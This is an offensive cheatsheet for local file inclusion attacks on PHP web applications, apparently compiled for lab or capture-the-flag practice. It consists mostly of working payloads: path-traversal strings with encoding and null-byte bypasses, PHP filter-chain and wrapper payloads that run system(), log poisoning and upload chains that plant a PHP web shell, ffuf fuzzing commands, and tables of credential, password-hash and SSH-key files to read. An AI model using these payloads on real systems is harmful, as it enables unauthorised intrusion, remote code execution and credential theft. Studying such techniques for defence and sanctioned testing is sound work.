# LFI Cheatsheet

## Quick Reference

| Technique | When to Use |
|---|---|
| Path Traversal | Default first try — `../` to read files |
| Double-dot bypass | App strips `../` once → `....//` survives |
| URL-encoded | Web server normalizes `../` but not `%2f` |
| Double URL-encoded | Proxy + backend both decode separately |
| Null byte | PHP < 5.3.4 appends `.php` to includes |
| PHP filter | Read source code as base64 without executing |
| PHP filter chain | RCE through filters alone (no file upload needed) |
| php://input | POST body becomes PHP code |
| data:// | Inline base64 code execution |
| expect:// | Direct command execution (rare) |
| Log poisoning | Inject PHP into logs, then LFI the log file |

---

## 1. Path Traversal Payloads

### Basic

```
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../etc/shadow
```

### Bypass: Double-dot (strips `../` once)

```
....//....//....//....//etc/passwd
....//....//....//....//etc/shadow
```

### Bypass: URL-encoded

```
..%2f..%2f..%2f..%2f..%2fetc/passwd
..%2f..%2f..%2f..%2f..%2fetc/shadow
```

### Bypass: Double URL-encoded

```
..%252f..%252f..%252f..%252fetc/passwd
```

### Bypass: Overlong UTF-8

```
..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
```

### Bypass: Full URL-encoded dots and slashes

```
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

### Bypass: Null byte (PHP < 5.3.4)

```
../../../../../../../etc/passwd%00
../../../../../../../etc/passwd%00.php
../../../../../../../etc/passwd%00.html
```

### Windows Targets

```
..\..\..\..\..\..\windows\system32\drivers\etc\hosts
....\\....\\....\\....\\windows\\system32\\drivers\\etc\\hosts
..%5c..%5c..%5c..%5c..%5cwindows/system32/drivers/etc/hosts
```

---

## 2. PHP Filter (Source Code Read)

Read PHP source as base64 without executing it:

```bash
# Common targets
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=db.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=.env
php://filter/convert.base64-encode/resource=wp-config.php

# Decode the output
echo "BASE64_OUTPUT" | base64 -d
```

---

## 3. PHP Filter Chain RCE

No file upload needed — executes PHP through filters alone:

```bash
# Generate the chain
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]);?>'

# Fire it
curl "http://$TARGET/index.php?page=<GENERATED_CHAIN>&0=id"

# URL-encode commands with spaces
curl --data-urlencode "0=cp ./uploads/shell.jpg ./uploads/shell.php" \
  "http://$TARGET/index.php?page=<CHAIN>"
```

---

## 4. PHP Wrappers for RCE

### php://input (POST body becomes PHP)

```bash
curl -s "http://$TARGET/page.php?file=php://input" \
  --data '<?php system("id"); ?>'
```

### data:// (inline base64 code)

```bash
echo -n '<?php system("id"); ?>' | base64
# PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==

curl "http://$TARGET/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg=="
```

### expect:// (if enabled — rare)

```bash
curl "http://$TARGET/page.php?file=expect://id"
```

---

## 5. Log Poisoning

### Step 1: Inject PHP into Apache access log via User-Agent

```bash
curl -A '<?php system($_GET["c"]); ?>' http://$TARGET/
```

### Step 2: Include the poisoned log

```
http://$TARGET/page.php?file=../../../../var/log/apache2/access.log&c=id
```

### Common log paths to try

```
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/httpd/access_log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/mail.log
/proc/self/environ
/proc/self/fd/0
```

---

## 6. ffuf LFI Fuzzing

### Fuzz for LFI with auto-filter

```bash
# Get baseline response size first
curl -s -o /dev/null -w '%{size_download}' "http://$TARGET/page.php?file=nonexistent"

# Fuzz with SecLists
ffuf -u "http://$TARGET/page.php?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -t 40 -c \
  -fs <BASELINE_SIZE>
```

### Fuzz for vulnerable parameter names

```bash
ffuf -u "http://$TARGET/index.php?FUZZ=../../../etc/passwd" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -t 40 -c \
  -fs <BASELINE_SIZE>
```

### Fuzz for LFI on Windows targets

```bash
ffuf -u "http://$TARGET/page.php?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt \
  -t 40 -c \
  -fs <BASELINE_SIZE>
```

### Best SecLists LFI wordlists (Kali paths)

```
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
```

---

## 7. High-Value Files to Read

### Linux

| File | What you get |
|---|---|
| `/etc/passwd` | Users — confirm LFI works |
| `/etc/shadow` | Password hashes (need root-level LFI) |
| `/etc/crontab` | Cron jobs — privesc paths |
| `/etc/sudoers` | Sudo rules |
| `/etc/exports` | NFS shares |
| `/etc/hosts` | Internal hostnames |
| `/etc/redis/redis.conf` | Redis password |
| `/etc/grafana/grafana.ini` | Grafana admin creds |
| `/etc/freeswitch/autoload_configs/event_socket.conf.xml` | FreeSWITCH password |
| `/etc/openfire/openfire.xml` | Openfire DB creds |
| `/etc/vsftpd.conf` | FTP config |
| `/var/www/html/wp-config.php` | WordPress DB creds |
| `/var/www/html/config.php` | App DB creds |
| `/var/www/html/.env` | Laravel/app secrets |
| `/proc/self/environ` | Environment variables — sometimes creds |
| `/home/<user>/.ssh/id_rsa` | SSH private key |
| `/root/.ssh/id_rsa` | Root SSH key |
| `/root/.ssh/authorized_keys` | Who can SSH as root |

### Windows

| File | What you get |
|---|---|
| `C:\windows\system32\drivers\etc\hosts` | Confirm LFI |
| `C:\windows\win.ini` | Confirm LFI |
| `C:\windows\system32\config\SAM` | Password hashes |
| `C:\inetpub\wwwroot\web.config` | IIS app config/creds |
| `C:\xampp\apache\conf\httpd.conf` | Apache config |
| `C:\Users\Administrator\...\ConsoleHost_history.txt` | PowerShell history |

---

## 8. LFI to RCE Chains

### Chain 1: Upload + LFI

```bash
# Upload webshell as allowed extension
echo '<?php system($_GET["c"]); ?>' > shell.jpg

# Upload via the app's upload form
curl -F "file=@shell.jpg" http://$TARGET/upload.php

# LFI to execute it (PHP processes it regardless of extension)
curl "http://$TARGET/page.php?file=uploads/shell.jpg&c=id"
```

### Chain 2: Log Poison + LFI

```bash
# Poison the log
curl -A '<?php system($_GET["c"]); ?>' http://$TARGET/

# Include the log
curl "http://$TARGET/page.php?file=../../../../var/log/apache2/access.log&c=id"
```

### Chain 3: PHP Filter Chain (no upload, no logs)

```bash
# Generate chain
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]);?>'

# Execute
curl "http://$TARGET/page.php?page=<CHAIN>&0=id"
```

### Chain 4: /proc/self/environ

```bash
# Inject PHP in User-Agent, then include environ
curl -A '<?php system("id"); ?>' \
  "http://$TARGET/page.php?file=../../../../proc/self/environ"
```

---

## 9. Using lfi_scan.sh

```bash
# Quick scan — tests 50+ payloads with curl
./lfi_scan.sh "http://TARGET/page.php?file=FUZZ"

# ffuf mode — auto-detects SecLists wordlists
./lfi_scan.sh "http://TARGET/page.php?file=FUZZ" auto

# Custom wordlist
./lfi_scan.sh "http://TARGET/page.php?file=FUZZ" /path/to/wordlist.txt

# Log poisoning helper commands
./lfi_scan.sh "http://TARGET/page.php?file=FUZZ" poison

# Generate standalone 409-payload wordlist
./lfi_scan.sh "http://TARGET/page.php?file=FUZZ" generate > lfi_payloads.txt
```

---

## 10. PG Boxes That Used LFI

| Box | Technique | Notes |
|---|---|---|
| Inclusiveness | Basic `../../../etc/passwd` | Direct path traversal |
| EvilBox1 | LFI → SSH key | Read `/home/user/.ssh/id_rsa` |
| Zipper | Upload + LFI | Upload as `.zip`, LFI with `zip://` wrapper |
| trilocor | PHP filter chain RCE | `php_filter_chain_generator.py` → code exec |
| bedside | Docker internal LFI | `..%2f..%2f` URL-encoded bypass |
| Snookums | RFI (not LFI) | `allow_url_include=On` → host PHP shell |
| Slort | RFI | Remote file inclusion |
| Boolean | LFI + SSH key upload | Rails file manager LFI → upload `authorized_keys` |
| Access-AD | `.htaccess` + upload | Upload `.htaccess` to allow `.xxx` as PHP |
